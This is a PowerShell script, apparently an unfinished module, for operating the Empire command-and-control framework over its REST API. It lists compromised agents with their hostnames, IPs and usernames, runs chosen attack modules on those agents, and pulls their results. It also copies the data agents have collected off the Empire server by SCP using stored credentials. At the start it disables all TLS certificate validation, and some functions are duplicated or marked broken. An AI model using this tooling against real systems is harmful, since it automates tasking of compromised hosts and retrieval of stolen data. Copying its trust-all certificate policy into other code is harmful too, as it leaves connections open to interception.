﻿#### All functions need to have proper function params, synopsis, help, etc....
#### Also where my psd1 file at

Import-Module CredentialManager -force

#[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
        return true;
    }
}
"@

[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy


function Get-EmpireModules
{
    param(
        [Parameter(Mandatory=$true)] $EmpireBox,
        [Parameter(Mandatory=$true)] $EmpireToken,
        $EmpirePort = '1337'
    )
    
    #Get Agents
    $Modules = Invoke-WebRequest -Method Get -uri "https://$EmpireBox`:$EmpirePort/api/modules?token=$EmpireToken"
    $Modules = $Modules.Content | ConvertFrom-Json
    
    $ModuleObjects = @()
    ForEach($Module in $Modules.modules)
    {
        
        $ModuleObject = [PSCustomObject]@{
            Name = $Module.Name
            Author = $Module.Author
            Comments = $Module.Comments
            Description = $Module.Description
            Language = $Module.Language
            NeedsAdmin = $Module.NeedsAdmin
            OpsecSafe = $Module.OpsecSafe
            options = $Module.options
        }
        $ModuleObjects = $ModuleObjects + $ModuleObject
    
    }
    
    return $ModuleObjects 

}



function Start-BSEmpireModuleOnAgent
{
    Param(
        [Parameter(Mandatory=$true)] $EmpireBox,
        [Parameter(Mandatory=$true)] $EmpireToken,
        $EmpirePort = '1337',
        [Parameter(Mandatory=$true)] $AgentName,
        [Parameter(Mandatory=$true)] $ModuleName,
        $Options = $null
    )

    $moduleURI = "https://$EmpireBox`:$EmpirePort/api/modules/"+$ModuleName+"?token=$EmpireToken"
    $PostBody = '{"Agent":"'+$AgentName+'"}'

    if($Options)
    {
        $PostBodyWithOptions = '{"Agent":"'+$AgentName+'",'+$Options+'}'
        $PostBody = $PostBodyWithOptions
    }
    
    Write-BSAuditLog -BSLogContent ("Module URI: " + $moduleURI)
    Write-BSAuditLog -BSLogContent ("Post Body: " + $PostBody)

    # TODO : MODULE OPTIONS IMPLEMENTATION
    <#
    # Guessing this is like...
    # {
        "Agent": "WTN1LHHRYHFWHXU3",
        "OPtion1": "Test",
        "Option2": "Test2"
    }
    #>
    
    #Get Agents
    $ModuleExecution = Invoke-WebRequest -Method Post -uri $moduleURI -Body $PostBody -ContentType 'application/json'
   
    $ModuleExecutionStatusCode = $ModuleExecution.StatusCode

    Write-BSAuditLog -BSLogContent ("Execution Code: " + $ModuleExecutionStatusCode)

    if($ModuleExecutionStatusCode -eq '200')
    {
        $ModuleExecution = $ModuleExecution.Content | ConvertFrom-Json
        $Return = (($ModuleExecution.msg) + " - Execution Status: " + ($ModuleExecution.success))
        $ReturnTitleCase = (Get-Culture).textinfo.totitlecase($Return.tolower())

        return $ReturnTitleCase 
    }
    else 
    {
        return ("Execution Status: FAILED")
    }

}


function Get-AgentDownloads
{
    Param(
        [Parameter(Mandatory=$true)] $CredentialName,
        [Parameter(Mandatory=$true)] $EmpireServer,
        [Parameter(Mandatory=$true)] $EmpireDirectory,
        [Parameter(Mandatory=$true)] $EmpireAgentName,
        [Parameter(Mandatory=$true)] $DownloadFolder
            
    )

    
    ### USER "CREDENTIAL MANAGER" TO CONNECT TO CRED MANAGER IN WINDERS
    $StoredCredential = Get-StoredCredential -Target $CredentialName

    $Credential = $StoredCredential

    $LocalDownloadFolder = ($DownloadFolder + $EmpireAgentName)
    $ExecutionResult = ""

    Try{
        Get-SCPFolder -LocalFolder $LocalDownloadFolder -RemoteFolder ($EmpireDirectory +'/downloads/'+$EmpireAgentName) -ComputerName $EmpireServer -Credential $Credential -Force
        $ExecutionResult = "OK"
    }
    Catch
    {
        $ExecutionResult = "FAIL"
    }

    return $ExecutionResult
}

Function Get-LocalAgentLogDetails
{

    Param(
        [Parameter(Mandatory=$true)] $DownloadFolder,
        [Parameter(Mandatory=$true)] $EmpireAgentName
    )
    
    $LocalAgentDownloadFolder = $DownloadFolder + $EmpireAgentName
    
    $TimeStampRegex = '\d\d\d\d-\d\d-\d\d \d\d:\d\d:\d\d :'  #LOL - TODO wtf is this?
    
    
    IF(Test-Path $LocalAgentDownloadFolder)
    {
        $AgentLogContent = Get-Content -Path ($LocalAgentDownloadFolder + '\agent.log')
        $AgentResultObjects = @()
        $ObjectData = "";
        ForEach($Line in $AgentLogContent)
        {
            if($Line -match $TimeStampRegex)
            {
             
                IF($ObjectData -ne "")
                {
                    $CompleteObjectData = $ObjectData
                    $ResultObject.Message = $CompleteObjectData;
                    $AgentResultObjects = $AgentResultObjects + $ResultObject
                    $ObjectData = ""
                }
    
                $ResultObject = [PSCustomObject]@{
                    TimeStamp = ($Line.ToString().Replace(' :',''))
                    Message = "test"
                }
    
            }
            else 
            {
                $ObjectData = $ObjectData + $Line;
              
            }
    
        }
    
    
        
    }
    
    
    
    Return $AgentResultObjects
    
    
    
   

}

Function Get-EmpireInformation
{
    Param(
        [Parameter(Mandatory=$true)]$EmpireBox,
        [Parameter(Mandatory=$true)]$EmpireToken,
        $EmpirePort = '1337'
)


    #Get Version
    $Verison = Invoke-WebRequest -Method Get -uri "https://$EmpireBox`:$EmpirePort/api/version?token=$EmpireToken"
    $Verison = $Verison.Content | ConvertFrom-Json
    $Verison = $Verison.version

    #Get Listeners
    $Listeners = Invoke-WebRequest -Method Get -uri "https://$EmpireBox`:$EmpirePort/api/listeners?token=$EmpireToken"
    $Listeners = $Listeners.Content | ConvertFrom-Json

    #Get Agents
    $Agents = Invoke-WebRequest -Method Get -uri "https://$EmpireBox`:$EmpirePort/api/agents?token=$EmpireToken"
    $Agents = $Agents.Content | ConvertFrom-Json
    ForEach($Agent in $Agents.agents)
    {
        #Write-Host $Agent.
    }


    #Start-Command 

    #& "curl --insecure -i https://$EmpireBox`:$EmpirePort/api/version?token=$EmpireToken"


}

Function Get-EmpireAgentResults
{
    
    Param(
        [Parameter(Mandatory=$true)]$EmpireBox,
        [Parameter(Mandatory=$true)]$EmpireToken,
        $EmpirePort = '1337',
        [Parameter(Mandatory=$true)]$AgentName
    )

    $uri = 'https://'+$EmpireBox+':'+$EmpirePort+'/api/agents/'+$AgentName+'/results?token='+$EmpireToken

    $AgentResults = Invoke-WebRequest -Method Get -uri $uri
    $AgentResults = $AgentResults.Content | ConvertFrom-Json
    $AgentResultObjects = @()
    ForEach($Result in $AgentResults.results.AgentResults)
    {
        
        $ResultObject = [PSCustomObject]@{
            agentname = $AgentName
            command = $Result.command 
            results = $Result.results 
        }
        $AgentResultObjects = $AgentResultObjects + $ResultObject

    }

    return $AgentResultObjects 
}

Function Get-EmpireAgents
{
    Param(
        [Parameter(Mandatory=$true)]$EmpireBox,
        [Parameter(Mandatory=$true)]$EmpireToken,
        $EmpirePort = '1337'
    )


    #Get Agents
    $Agents = Invoke-WebRequest -Method Get -uri "https://$EmpireBox`:$EmpirePort/api/agents?token=$EmpireToken"
    $Agents = $Agents.Content | ConvertFrom-Json

    $AgentObjects = @()
    ForEach($Agent in $Agents.agents)
    {
        
        $AgentObject = [PSCustomObject]@{
            id = $Agent.ID
            checkin_time = $Agent.checkin_time
            external_ip = $Agent.external_ip
            hostname = $Agent.hostname
            internal_ip = $Agent.internal_ip
            langauge = $Agent.language
            langauge_version = $Agent.language_version
            lastseen_time = $Agent.lastseen_time
            listener = $Agent.listener
            name = $Agent.name
            os_details = $Agent.os_details
            username = $Agent.username
        }
        $AgentObjects = $AgentObjects + $AgentObject

    }

    return $AgentObjects 
}



Function Get-EmpireModules{

    Param(
        [Parameter(Mandatory=$true)] $EmpireBox,
        [Parameter(Mandatory=$true)] $EmpireToken,
        $EmpirePort = '1337'
    )

    #Get Agents
    $Modules = Invoke-WebRequest -Method Get -uri "https://$EmpireBox`:$EmpirePort/api/modules?token=$EmpireToken"
    $Modules = $Modules.Content | ConvertFrom-Json

    $ModuleObjects = @()
    ForEach($Module in $Modules.modules)
    {
        
        $ModuleObject = [PSCustomObject]@{
            Name = $Module.Name
            Author = $Module.Author
            Comments = $Module.Comments
            Description = $Module.Description
            Language = $Module.Language
            NeedsAdmin = $Module.NeedsAdmin
            OpsecSafe = $Module.OpsecSafe
            options = $Module.options
        }
        $ModuleObjects = $ModuleObjects + $ModuleObject

    }

    return $ModuleObjects 


}


Function Get-EmpireStatus
{
    Param(
        [Parameter(Mandatory=$true)] $EmpireBox,
        [Parameter(Mandatory=$true)] $EmpireToken,
        $EmpirePort = '1337'
    )

    #Get Configuration
    try{
        $ConfigurationInformation = Invoke-WebRequest -Method Get -uri "https://$EmpireBox`:$EmpirePort/api/config?token=$EmpireToken"
        $ConfigurationInformation = $ConfigurationInformation.Content | ConvertFrom-Json
        $ConfigurationInformation = $ConfigurationInformation.config


        $ConfigurationInformationObject = [PSCustomObject]@{
            empire_host = $EmpireBox
            empire_port = $EmpirePort
            empire_token = $EmpireToken
            api_username = $ConfigurationInformation.api_username
            install_path = $ConfigurationInformation.install_path
            version    = $ConfigurationInformation.version
            sync_time = ($(Get-Date -Format 'yyyy-MM-dd hh:mm:ss'))
        }

    }
    catch
    {
        $ConfigurationInformationObject = $null
    }
    
    return $ConfigurationInformationObject 
}

Function Get-EmpireReports
{
    #https://github.com/EmpireProject/Empire/wiki/RESTful-API

    Param(
        [Parameter(Mandatory=$true)] $EmpireBox,
        [Parameter(Mandatory=$true)] $EmpireToken,
        $EmpirePort = '1337',
        [Parameter(Mandatory=$true)] $AgentName,
        $Options = "",
        $ReportType  =  "result"  #task, result, checkin
    )

    ### AGENT - NOT WORKING
    $uri = 'https://'+$EmpireBox+':'+$EmpirePort+'/api/reporting/agent/'+$AgentName+'?token='+$EmpireToken

    ### ALL - WORKING
    #$uri = "https://$EmpireBox`:$EmpirePort/api/reporting?token="+$EmpireToken

    ### TYPE
    $uri = 'https://'+$EmpireBox+':'+$EmpirePort+'/api/reporting/type/'+$ReportType+'?token='+$EmpireToken


    $uri
    $Reports = Invoke-WebRequest -Method Get -uri $uri
    $Reports = $Reports.Content | ConvertFrom-Json
    $ReportObjects = @()
    ForEach($Report in $Reports.reporting)
    {
        
        $ReportObject = [PSCustomObject]@{
            id = $Report.ID
            agentname = $Report.agentname
            event_type = $Report.event_type
            message = $Report.message
            timestamp = $Report.timestamp
    
        }
        $ReportObjects = $ReportObjects + $ReportObject

    }

    return $ReportObjects 
}